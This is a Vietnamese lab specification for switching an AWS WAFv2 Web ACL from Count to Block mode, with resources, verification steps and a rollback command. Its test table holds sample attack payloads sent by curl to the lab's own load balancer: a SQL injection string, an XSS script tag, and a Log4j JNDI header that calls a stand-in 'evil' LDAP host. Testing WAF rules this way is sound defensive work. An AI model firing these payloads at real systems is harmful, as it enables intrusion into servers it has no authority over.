# 07.04 — Đặc Tả Quy Trình Chuyển Đổi An Toàn Count-to-Block & Kiểm Thử Chặn Tấn Công L7

> **Mã bài lab:** `07.04`
> **Trạng thái tài liệu:** `RUNTIME_PASS`
> **Vùng triển khai:** `ap-southeast-1` (Singapore)
> **File bằng chứng:** `evidence/07-waf/04-waf-block-evidence.log`

---

## 1. Mục Tiêu (Objective)

Đặc tả quy trình chuyển đổi cấu hình an toàn từ chế độ đếm (Count) sang chế độ chặn trực tiếp (Block Mode) trên AWS WAFv2 Web ACL và kiểm chứng khả năng bảo vệ L7 trước các cuộc tấn công SQLi, XSS, Log4j và tràn ngưỡng Rate Limiting.

---

## 2. Tài Nguyên (Resources)

| Tên Logical | Loại Resource | Phạm Vi Áp Dụng | Runtime ID / ARN (Snapshot) |
| :--- | :--- | :--- | :--- |
| `fabric-edge-web-acl` | `AWS::WAFv2::WebACL` | Regional (`ap-southeast-1`) | ID: `a010b9c0-edfa-4ba4-bfb0-8691ae8ecf56` |
| `fabric-rate-limit-rule` | `AWS::WAFv2::Rule` | Priority 0 (Action: `Block`) | Custom Response: HTTP 429 Too Many Requests |
| `AWSManagedRulesCommonRuleSet` | `AWS::WAFv2::ManagedRuleGroup` | Priority 1 (Action: `Block`) | HTTP 403 Forbidden |
| `AWSManagedRulesKnownBadInputsRuleSet` | `AWS::WAFv2::ManagedRuleGroup` | Priority 2 (Action: `Block`) | HTTP 403 Forbidden |
| `AWSManagedRulesAmazonIpReputationList` | `AWS::WAFv2::ManagedRuleGroup` | Priority 3 (Action: `Block`) | HTTP 403 Forbidden |
| `aws-waf-logs-fabric-edge-waf` | `AWS::Logs::LogGroup` | Regional (`ap-southeast-1`) | Nhật ký phân tích WAF L7 |

*Ghi chú: Runtime ID / ARN là dữ liệu snapshot tại thời điểm kiểm tra thực tế; Tên Logical là định danh chuẩn theo thiết kế.*

---

## 3. Thẻ Định Danh (Tags)

| Key | Value | Phạm Vi Áp Dụng |
| :--- | :--- | :--- |
| `Name` | `fabric-edge-web-acl` | AWS WAF Web ACL |
| `Project` | `aws-eks-secure-network-fabric` | AWS WAF Web ACL và CloudWatch Logs |
| `Environment` | `prod` | AWS WAF Web ACL và CloudWatch Logs |
| `ManagedBy` | `manual` | Quản trị chính sách an ninh ứng dụng thủ công Console/CLI |

---

## 4. Cấu Hình Chi Tiết (Configuration)

### 4.1 Cấu Hình Hành Vi Chặn (Block Actions)

- **Managed Rule Groups:** Tắt tùy chọn `Set all rule actions to count` trên cả 3 nhóm quy tắc AWS Managed Rules (`CommonRuleSet`, `KnownBadInputsRuleSet`, `AmazonIpReputationList`) để kích hoạt hành vi `Block` mặc định.
- **Rate-Based Rule (`fabric-rate-limit-rule`):**
  - Đổi Action từ `Count` sang `Block`.
  - Cấu hình Custom Response Code: `429` (Too Many Requests).
  - Ngưỡng đánh giá: 500 requests trong cửa sổ trượt 5 phút per Client IP.

### 4.2 Kịch Bản Kiểm Thử Tấn Công L7

| Kịch Bản Thử Nghiệm | Gói Tin / Payload Mẫu | Mã Lỗi Kỳ Vọng | Quy Tắc Chặn Chịu Trách Nhiệm |
| :--- | :--- | :---: | :--- |
| **SQL Injection (SQLi)** | `curl "https://$ALB_DNS/?id=1'%20OR%20'1'='1"` | `HTTP 403` | `AWSManagedRulesCommonRuleSet` |
| **Cross-Site Scripting (XSS)** | `curl "https://$ALB_DNS/?q=<script>alert('xss')</script>"` | `HTTP 403` | `AWSManagedRulesCommonRuleSet` |
| **Log4j JNDI Exploit** | `curl -H "User-Agent: \${jndi:ldap://evil/a}" "https://$ALB_DNS/"` | `HTTP 403` | `AWSManagedRulesKnownBadInputsRuleSet` |
| **Rate Limit Spike** | Vòng lặp gửi > 500 requests / phút từ 1 IP | `HTTP 429` | `fabric-rate-limit-rule` |

---

## 5. Phụ Thuộc (Dependencies)

- Phụ thuộc vào `07.02`: Web ACL `fabric-edge-web-acl` đã hoạt động ở chế độ Count và tích lũy đủ baseline telemetry.
- Phụ thuộc vào `07.03`: Application Load Balancer `fabric-edge-public-alb` đã liên kết thành công với Web ACL.
- Phụ thuộc vào CloudWatch Log Group `aws-waf-logs-fabric-edge-waf` để thu thập và đối soát bằng chứng chặn.

---

## 6. Kiểm Tra Đạt (Verification)

| Kiểm Tra | Lệnh / Tiêu Chí Xác Minh | Kết Quả Mong Đợi |
| :--- | :--- | :--- |
| **Trạng thái Quy tắc Block** | `aws wafv2 get-web-acl --name fabric-edge-web-acl --scope REGIONAL --id a010b9c0-edfa-4ba4-bfb0-8691ae8ecf56` | Tất cả 4 rules đều có Action cấu hình là `Block`. |
| **Chặn Payload Độc Hại** | Gửi các request SQLi, XSS, Log4j tới endpoint công khai | Nhận phản hồi `HTTP/2 403 Forbidden` ngay lập tức. |
| **Phản Hồi Vượt Ngưỡng Rate** | Gửi > 500 requests / 5 phút từ một địa chỉ IP | Nhận phản hồi `HTTP 429 Too Many Requests`. |
| **Traffic Overview Runtime** | Quan sát giao diện AWS WAF Dashboard | Tổng số 407 requests: **22 Blocked**, **385 Allowed** (chứng minh hệ thống phân loại chính xác giữa request hợp lệ và tấn công). |

---

## 7. Cảnh Báo An Toàn & Rollback Plan

- **Cảnh báo false-positive:** Trong trường hợp cập nhật tính năng ứng dụng khiến người dùng hợp lệ bị chặn nhầm, lập tức chuyển quy tắc gây lỗi về chế độ Count để điều tra.
- **Quy trình Rollback:**
  ```bash
  # Cập nhật Web ACL đưa các rule groups quay trở lại chế độ Count
  aws wafv2 update-web-acl --name fabric-edge-web-acl --scope REGIONAL \
    --id a010b9c0-edfa-4ba4-bfb0-8691ae8ecf56 --lock-token <LockToken> \
    --default-action Allow={} --rules file://rules-count-mode.json
  ```
